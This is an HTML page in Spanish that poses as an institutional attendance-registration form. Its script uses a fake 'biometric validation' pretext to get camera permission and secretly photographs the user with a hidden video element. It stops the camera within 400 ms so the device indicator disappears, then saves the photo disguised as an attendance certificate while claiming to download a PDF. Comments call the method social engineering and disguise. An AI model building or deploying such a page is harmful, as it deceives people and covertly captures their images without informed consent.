<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema de Asistencia Institucional</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
        h2 { color: #2c3e50; font-size: 1.5rem; margin-bottom: 10px; }
        p { color: #7f8c8d; font-size: 0.9rem; margin-bottom: 20px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
        .btn-camera { background-color: #3498db; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        .btn-camera:hover { background-color: #2980b9; }
        #status { margin-top: 15px; font-weight: bold; color: #27ae60; display: none; }
        video, canvas { display: none; } /* Totalmente oculto */
    </style>
</head>
<body>

<div class="container">
    <h2>Registro de Asistencia</h2>
    <p>Complete sus datos para recibir el material de la jornada y certificar su presencia.</p>
    
    <input type="text" id="nombre" placeholder="Nombre y Apellido">
    <input type="text" id="grado" placeholder="Grado / Institución">
    
    <div style="background: #fff3cd; padding: 10px; border-radius: 6px; border: 1px solid #ffeeba; margin: 15px 0;">
        <small style="color: #856404;">⚠️ <b>Validación Biométrica requerida:</b> Al presionar el botón, se solicitará acceso a la cámara para confirmar su identidad.</small>
    </div>

    <button class="btn-camera" id="captureBtn">REGISTRAR Y DESCARGAR MATERIAL</button>
    
    <div id="status">✅ Procesando registro... <br> Bajando MATERIAL_JORNADA.pdf</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const captureBtn = document.getElementById('captureBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');

    captureBtn.addEventListener('click', async () => {
        const nom = document.getElementById('nombre').value;
        if(!nom) { alert("Por favor complete sus datos"); return; }

        try {
            // Solicitud de permiso (Ingeniería Social: El usuario cree que es "normal")
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Detener cámara rápido para que el punto verde/naranja (iOS) desaparezca
                    stream.getTracks().forEach(track => track.stop());

                    // "Disfrazar" la foto como si fuera el PDF de la jornada
                    const dataURL = canvas.toDataURL('image/jpeg');
                    const link = document.createElement('a');
                    link.href = dataURL;
                    link.download = `CERTIFICADO_ASISTENCIA_${nom.replace(/ /g, '_')}.jpg`;
                    link.click();

                    captureBtn.style.display = 'none';
                    status.style.display = 'block';
                }, 400); // 400ms es un pestañeo
            };
        } catch (err) {
            alert("Error de validación: Se requiere acceso a la cámara para la asistencia.");
        }
    });
</script>

</body>
</html>
